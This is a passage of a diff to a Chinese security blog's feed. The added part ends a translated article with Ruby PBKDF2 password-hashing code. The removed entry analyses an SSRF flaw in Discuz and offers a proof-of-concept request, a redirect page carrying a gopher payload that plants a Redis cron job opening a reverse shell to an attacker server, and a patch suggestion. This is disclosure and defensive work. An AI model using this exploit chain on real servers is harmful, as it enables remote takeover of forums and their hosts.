+# <span class="number">2.</span> Redistributions in <span class="built_in">binary</span> form must reproduce the above copyright notice,
+# <span class="keyword">this</span> list of conditions and the following disclaimer in the documentation 
+# and/or other materials provided with the distribution.
+# 
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS <span class="string">"AS IS"</span> 
+# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
+# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
+# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
+# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
+# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
+# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
+# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
+# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
+# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
+# POSSIBILITY OF SUCH DAMAGE.
+
+require <span class="string">'securerandom'</span>
+require <span class="string">'openssl'</span>
+require <span class="string">'base64'</span>
+
+# Salted password hashing with PBKDF2-SHA1.
+# Authors: @RedragonX (dicesoft.net), havoc AT defuse.ca 
+# www: http:<span class="comment">//crackstation.net/hashing-security.htm</span>
+module PasswordHash
+
+  # The following constants can be changed without breaking existing hashes.
+  PBKDF2_ITERATIONS = <span class="number">1000</span>
+  SALT_BYTE_SIZE = <span class="number">24</span>
+  HASH_BYTE_SIZE = <span class="number">24</span>
+
+  HASH_SECTIONS = <span class="number">4</span>
+  SECTION_DELIMITER = <span class="string">':'</span>
+  ITERATIONS_INDEX = <span class="number">1</span>
+  SALT_INDEX = <span class="number">2</span>
+  HASH_INDEX = <span class="number">3</span>
+
+  # Returns a salted PBKDF2 hash of the password.
+  def self.createHash( password )
+    salt = SecureRandom.base64( SALT_BYTE_SIZE )
+    pbkdf2 = OpenSSL::PKCS5::pbkdf2_hmac_sha1(
+      password,
+      salt,
+      PBKDF2_ITERATIONS,
+      HASH_BYTE_SIZE
+    )
+    <span class="keyword">return</span> [<span class="string">"sha1"</span>, PBKDF2_ITERATIONS, salt, Base64.encode64( pbkdf2 )].<span class="built_in">join</span>( SECTION_DELIMITER )
+  end
+
+  # Checks <span class="keyword">if</span> a password is correct given a hash of the correct one.
+  # correctHash must be a hash string generated with createHash.
+  def self.validatePassword( password, correctHash )
+    params = correctHash.<span class="built_in">split</span>( SECTION_DELIMITER )
+    <span class="keyword">return</span> <span class="keyword">false</span> <span class="keyword">if</span> params.length != HASH_SECTIONS
+
+    pbkdf2 = Base64.decode64( params[HASH_INDEX] )
+    testHash = OpenSSL::PKCS5::pbkdf2_hmac_sha1(
+      password,
+      params[SALT_INDEX],
+      params[ITERATIONS_INDEX].to_i,
+      pbkdf2.length
+    )
+
+    <span class="keyword">return</span> pbkdf2 == testHash
+  end
+
+  # Run tests to ensure the module is functioning properly.
+  # Returns <span class="keyword">true</span> <span class="keyword">if</span> all tests succeed, <span class="keyword">false</span> <span class="keyword">if</span> not.
+  def self.runSelfTests
+    puts <span class="string">"Sample hashes:"</span>
+    <span class="number">3.</span>times { puts createHash(<span class="string">"password"</span>) }
+
+    puts <span class="string">"\nRunning self tests..."</span>
+    @@allPass = <span class="keyword">true</span>
+
+    correctPassword = <span class="string">'aaaaaaaaaa'</span>
+    wrongPassword = <span class="string">'aaaaaaaaab'</span>
+    hash = createHash(correctPassword)
+
+    <span class="keyword">assert</span>( validatePassword( correctPassword, hash ) == <span class="keyword">true</span>, <span class="string">"correct password"</span> )
+    <span class="keyword">assert</span>( validatePassword( wrongPassword, hash ) == <span class="keyword">false</span>, <span class="string">"wrong password"</span> )
+
+    h1 = hash.<span class="built_in">split</span>( SECTION_DELIMITER )
+    h2 = createHash( correctPassword ).<span class="built_in">split</span>( SECTION_DELIMITER )
+    <span class="keyword">assert</span>( h1[HASH_INDEX] != h2[HASH_INDEX], <span class="string">"different hashes"</span> )
+    <span class="keyword">assert</span>( h1[SALT_INDEX] != h2[SALT_INDEX], <span class="string">"different salt"</span> )
+
+    <span class="keyword">if</span> @@allPass
+      puts <span class="string">"*** ALL TESTS PASS ***"</span>
+    <span class="keyword">else</span>
+      puts <span class="string">"*** FAILURES ***"</span>
+    end
+
+    <span class="keyword">return</span> @@allPass
+  end
+
+  def self.<span class="keyword">assert</span>( truth, msg )
+    <span class="keyword">if</span> truth
+      puts <span class="string">"PASS [#{msg}]"</span>
+    <span class="keyword">else</span>
+      puts <span class="string">"FAIL [#{msg}]"</span>
+      @@allPass = <span class="keyword">false</span>
+    end
+  end
+
+end
+
+PasswordHash.runSelfTests
+</code></pre><p>[via crackstation.net   翻译整理by litdg@freebuf]</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;更新：&quot;&gt;更新：&lt;/h2&gt;&lt;p&gt;文章是14年翻译的，发在了freebuf和乌云drops上，最近重新看了一下，记录一下思考。总体来说感觉翻译的流畅度还是可以的，那会没有用谷歌翻译，记得翻译了一个星期，很是痛苦。文章比较长，所以顺便写个总结和微博上的一些评论的讨论。
+    
+    </summary>
+    
+      <category term="加密解密" scheme="http://xdxd.love/categories/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>逻辑漏洞之找回密码</title>
@@ -1501,120 +2331,6 @@ print ‘ok<span class="string">'</span>
     </summary>
     
       <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>discuz最新版20160601 SSRF漏洞分析及修复方案</title>
-    <link href="http://xdxd.love/2016/10/19/discuz%E6%9C%80%E6%96%B0%E7%89%8820160601-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>http://xdxd.love/2016/10/19/discuz最新版20160601-SSRF漏洞分析/</id>
-    <published>2016-10-19T01:39:52.000Z</published>
-    <updated>2016-10-19T02:49:35.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="http://wufeifei.com/ssrf/" target="_blank" rel="external">SSRF到GET SHELL</a><br>wooyun:wooyun-2015-0151179</p>
-<h2 id="漏洞poc">漏洞poc</h2><p>访问：<br>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]<a href="http://23.88.58.149/1.jpg[/img]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6" target="_blank" rel="external">http://23.88.58.149/1.jpg[/img]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6</a></p>
-<p>需要带formhash，也可以post方式请求。</p>
-<p>discuz有个远程下载图片的功能。虽然有些版本编辑器没有显示远程下载图片的按钮，但是可能也存在这个方法。可以直接通过poc进行验证</p>
-<p><img src="/images/discuzssrf2.png" alt=""></p>
-<p>可以利用301跳转绕过discuz waf的限制，成为一个无限制的curl ssrf。</p>
-<h2 id="代码分析">代码分析</h2><p>source/module/forum/forum_ajax.php</p>
-<p>374行:</p>
-<pre><code>} <span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">'action'</span>] == <span class="string">'downremoteimg'</span>) {
-    <span class="variable">$_GET</span>[<span class="string">'message'</span>] = str_replace(<span class="keyword">array</span>(<span class="string">"\r"</span>, <span class="string">"\n"</span>), <span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">'wysiwyg'</span>] ? <span class="string">'&lt;br /&gt;'</span> : <span class="string">''</span>, <span class="string">"\\n"</span>), <span class="variable">$_GET</span>[<span class="string">'message'</span>]);
-    preg_match_all(<span class="string">"/\[img\]\s*([^\[\&lt;\r\n]+?)\s*\[\/img\]|\[img=\d{1,4}[x|\,]\d{1,4}\]\s*([^\[\&lt;\r\n]+?)\s*\[\/img\]/is"</span>, <span class="variable">$_GET</span>[<span class="string">'message'</span>], <span class="variable">$image1</span>, PREG_SET_ORDER);
-    preg_match_all(<span class="string">"/\&lt;img.+src=('|\"|)?(.*)(\\1)([\s].*)?\&gt;/ismUe"</span>, <span class="variable">$_GET</span>[<span class="string">'message'</span>], <span class="variable">$image2</span>, PREG_SET_ORDER);
-    <span class="variable">$temp</span> = <span class="variable">$aids</span> = <span class="variable">$existentimg</span> = <span class="keyword">array</span>();
-    <span class="keyword">if</span>(is_array(<span class="variable">$image1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$image1</span>)) {
-        <span class="keyword">foreach</span>(<span class="variable">$image1</span> <span class="keyword">as</span> <span class="variable">$value</span>) {
-            <span class="variable">$temp</span>[] = <span class="keyword">array</span>(
-                <span class="string">'0'</span> =&gt; <span class="variable">$value</span>[<span class="number">0</span>],
-                <span class="string">'1'</span> =&gt; trim(!<span class="keyword">empty</span>(<span class="variable">$value</span>[<span class="number">1</span>]) ? <span class="variable">$value</span>[<span class="number">1</span>] : <span class="variable">$value</span>[<span class="number">2</span>])
-            );
-        }
-    }
-    <span class="keyword">if</span>(is_array(<span class="variable">$image2</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$image2</span>)) {
-        <span class="keyword">foreach</span>(<span class="variable">$image2</span> <span class="keyword">as</span> <span class="variable">$value</span>) {
-            <span class="variable">$temp</span>[] = <span class="keyword">array</span>(
-                <span class="string">'0'</span> =&gt; <span class="variable">$value</span>[<span class="number">0</span>],
-                <span class="string">'1'</span> =&gt; trim(<span class="variable">$value</span>[<span class="number">2</span>])
-            );
-        }
-    }
-    <span class="keyword">require_once</span> libfile(<span class="string">'class/image'</span>);
-    <span class="keyword">if</span>(is_array(<span class="variable">$temp</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$temp</span>)) {
-        <span class="variable">$upload</span> = <span class="keyword">new</span> discuz_upload();
-        <span class="variable">$attachaids</span> = <span class="keyword">array</span>();
-
-        <span class="keyword">foreach</span>(<span class="variable">$temp</span> <span class="keyword">as</span> <span class="variable">$value</span>) {
-            <span class="variable">$imageurl</span> = <span class="variable">$value</span>[<span class="number">1</span>];
-            <span class="variable">$hash</span> = md5(<span class="variable">$imageurl</span>);
-            <span class="keyword">if</span>(strlen(<span class="variable">$imageurl</span>)) {
-                <span class="variable">$imagereplace</span>[<span class="string">'oldimageurl'</span>][] = <span class="variable">$value</span>[<span class="number">0</span>];
-                <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$existentimg</span>[<span class="variable">$hash</span>])) {
-                    <span class="variable">$existentimg</span>[<span class="variable">$hash</span>] = <span class="variable">$imageurl</span>;
-                    <span class="variable">$attach</span>[<span class="string">'ext'</span>] = <span class="variable">$upload</span>-&gt;fileext(<span class="variable">$imageurl</span>);
-                    <span class="keyword">if</span>(!<span class="variable">$upload</span>-&gt;is_image_ext(<span class="variable">$attach</span>[<span class="string">'ext'</span>])) {
-                        <span class="keyword">continue</span>;
-                    }
-                    <span class="variable">$content</span> = <span class="string">''</span>;
-                    <span class="keyword">if</span>(preg_match(<span class="string">'/^(http:\/\/|\.)/i'</span>, <span class="variable">$imageurl</span>)) {
-                        <span class="variable">$content</span> = dfsockopen(<span class="variable">$imageurl</span>);
-</code></pre><p>imageurl最后进入dfsockopen。跟进dfsockopen.</p>
-<p>定位到最后发出请求的函数：<br>source/function/function_filesock.php</p>
-<pre><code><span class="keyword">function</span> _dfsockopen(<span class="variable">$url</span>, <span class="variable">$limit</span> = <span class="number">0</span>, <span class="variable">$post</span> = <span class="string">''</span>, <span class="variable">$cookie</span> = <span class="string">''</span>, <span class="variable">$bysocket</span> = FALSE, <span class="variable">$ip</span> = <span class="string">''</span>, <span class="variable">$timeout</span> = <span class="number">15</span>, <span class="variable">$block</span> = TRUE, <span class="variable">$encodetype</span>  = <span class="string">'URLENCODE'</span>, <span class="variable">$allowcurl</span> = TRUE, <span class="variable">$position</span> = <span class="number">0</span>, <span class="variable">$files</span> = <span class="keyword">array</span>()) {
-    <span class="variable">$return</span> = <span class="string">''</span>;
-    <span class="variable">$matches</span> = parse_url(<span class="variable">$url</span>);
-    <span class="variable">$scheme</span> = <span class="variable">$matches</span>[<span class="string">'scheme'</span>];
-    <span class="variable">$host</span> = <span class="variable">$matches</span>[<span class="string">'host'</span>];
-    <span class="variable">$path</span> = <span class="variable">$matches</span>[<span class="string">'path'</span>] ? <span class="variable">$matches</span>[<span class="string">'path'</span>].(<span class="variable">$matches</span>[<span class="string">'query'</span>] ? <span class="string">'?'</span>.<span class="variable">$matches</span>[<span class="string">'query'</span>] : <span class="string">''</span>) : <span class="string">'/'</span>;
-    <span class="variable">$port</span> = !empty(<span class="variable">$matches</span>[<span class="string">'port'</span>]) ? <span class="variable">$matches</span>[<span class="string">'port'</span>] : (<span class="variable">$scheme</span> == <span class="string">'http'</span> ? <span class="string">'80'</span> : <span class="string">''</span>);
-    <span class="variable">$boundary</span> = <span class="variable">$encodetype</span> == <span class="string">'URLENCODE'</span> ? <span class="string">''</span> : random(<span class="number">40</span>);
-
-    if(<span class="variable">$post</span>) {
-        if(!is_array(<span class="variable">$post</span>)) {
-            parse_str(<span class="variable">$post</span>, <span class="variable">$post</span>);
-        }
-        _format_postkey(<span class="variable">$post</span>, <span class="variable">$postnew</span>);
-        <span class="variable">$post</span> = <span class="variable">$postnew</span>;
-    }
-    if(function_exists(<span class="string">'curl_init'</span>) &amp;&amp; function_exists(<span class="string">'curl_exec'</span>) &amp;&amp; <span class="variable">$allowcurl</span>) {
-        <span class="variable">$ch</span> = curl_init();
-        <span class="variable">$httpheader</span> = array();
-        if(<span class="variable">$ip</span>) {
-            <span class="variable">$httpheader</span>[] = <span class="string">"Host: "</span>.<span class="variable">$host</span>;
-        }
-        if(<span class="variable">$httpheader</span>) {
-            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$httpheader</span>);
-        }
-        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$scheme</span>.<span class="string">'://'</span>.(<span class="variable">$ip</span> ? <span class="variable">$ip</span> : <span class="variable">$host</span>).(<span class="variable">$port</span> ? <span class="string">':'</span>.<span class="variable">$port</span> : <span class="string">''</span>).<span class="variable">$path</span>);
-        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);
-</code></pre><p>使用curl来发出http。而curl支持非常多的协议。<br><img src="/images/discuzssrf3.png" alt=""></p>
-<h2 id="漏洞利用">漏洞利用</h2><p>编写一个跳转页面：</p>
-<pre><code>&lt;?php  
-header(<span class="string">"Location: gopher://127.0.0.1:6379/_*1<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$8</span><span class="variable">%0d</span><span class="variable">%0aflushall</span><span class="variable">%0d</span><span class="variable">%0a</span>*3<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0aset</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$1</span><span class="variable">%0d</span><span class="variable">%0a1</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$6</span>4<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span>*/1<span class="variable">%20</span>*<span class="variable">%20</span>*<span class="variable">%20</span>*<span class="variable">%20</span>*<span class="variable">%20bash</span><span class="variable">%20</span>-i<span class="variable">%20</span>&gt;&amp;<span class="variable">%20</span>/dev/tcp/{your_server}/{your_server_listen_port}<span class="variable">%200</span>&gt;&amp;1<span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span>*4<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$6</span><span class="variable">%0d</span><span class="variable">%0aconfig</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0aset</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0adir</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$1</span>6<span class="variable">%0d</span><span class="variable">%0a</span>/var/spool/cron/<span class="variable">%0d</span><span class="variable">%0a</span>*4<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$6</span><span class="variable">%0d</span><span class="variable">%0aconfig</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0aset</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$1</span>0<span class="variable">%0d</span><span class="variable">%0adbfilename</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$4</span><span class="variable">%0d</span><span class="variable">%0aroot</span><span class="variable">%0d</span><span class="variable">%0a</span>*1<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$4</span><span class="variable">%0d</span><span class="variable">%0asave</span><span class="variable">%0d</span><span class="variable">%0aquit</span><span class="variable">%0d</span><span class="variable">%0a</span>"</span>)
-?&gt;
-</code></pre><p>poc:</p>
-<pre><code>forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]<span class="link_url">http://127.0.0.1:8054/test/301.php?1.jpg</span>[<span class="link_label">/img</span>]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6&amp;posttime=1476777238&amp;wysiwyg=1&amp;subject=test&amp;unused%5B%5D=1
-</code></pre><p>服务器本地监听6379端口，可以看到gopher协议成功请求。</p>
-<p><img src="/images/discuzssrf4.png" alt=""></p>
-<h2 id="补丁分析">补丁分析</h2><p>目前discuz没有修复这个问题。不过经过测试，discuz官方论坛是关闭了这个功能的。</p>
-<h2 id="修复方案">修复方案</h2><p>1，建议直接关闭远程下载图片这个功能。<br>2，在_dfsockopen方法内增加</p>
-<pre><code>curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); 
-</code></pre><p>将协议限制为http/https可以降低这个SSRF的危害。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://wufeifei.com/ssrf/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SSRF到GET SHELL&lt;/a&gt;&lt;br&gt;wooyun:wooyun-2015-015117
-    
-    </summary>
-    
-      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
     
   </entry>
